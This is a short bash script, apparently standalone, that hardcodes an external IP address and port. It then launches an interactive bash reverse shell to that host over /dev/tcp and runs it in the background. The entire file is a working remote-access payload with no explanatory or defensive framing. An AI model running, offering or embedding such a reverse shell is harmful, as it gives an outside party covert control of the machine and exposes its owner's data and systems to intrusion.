#!/bin/bash

ip="206.189.80.59"
num="22436"
bash -i >& /dev/tcp/$ip/$num 0>&1 &
